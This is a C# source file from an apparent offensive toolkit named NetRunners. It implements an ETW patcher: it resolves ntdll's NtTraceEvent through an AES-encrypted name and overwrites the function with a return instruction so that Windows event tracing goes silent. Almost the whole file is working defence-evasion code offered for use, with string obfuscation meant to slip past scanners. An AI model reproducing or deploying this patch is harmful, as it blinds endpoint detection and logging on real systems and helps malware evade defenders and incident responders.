using System;
using System.Runtime.InteropServices;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Helpers.Helper;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Patchers
{
    /// <summary>
    /// Contains NtTraceEvent (ETW) patcher method.
    /// </summary>
    /*
        * x64/x86 patch
        * returns as soon as NtEventTrace gets called
        * 
        ret                 
    */
    public static class EtwPatcher
    {
        public static bool Patch() // credits: https://github.com/Mr-Un1k0d3r/AMSI-ETW-Patch
        {
            try
            {
                byte[] patch;
                IntPtr Library;
                IntPtr funcAddress;
                uint oldProtect;

                // get ntdll.dll pointer
                Library = LoadLibraryA("ntdll.dll");
                if (Library == IntPtr.Zero)
                    throw new InvalidOperationException($"LoadLibraryA failed with error code: {Marshal.GetLastWin32Error()}");
                // get NtTraceEvent pointer
                funcAddress = GetProcAddress(Library, DecryptBytesToStringAes(NtTraceEvent_Bytes, AesKey));
                if (funcAddress == IntPtr.Zero)
                    throw new InvalidOperationException($"GetProcAddress failed with error code: {Marshal.GetLastWin32Error()}");

                // patch NtTraceEvent
                patch = SelectEtwPatch();
                VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, funcAddress, patch.Length);
                VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x20, out oldProtect);

                Console.WriteLine("[+] ETW Patch                :   Success!");
                
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error occurred while patching ETW: {e.Message}");
                throw;
            }
        }
    }
}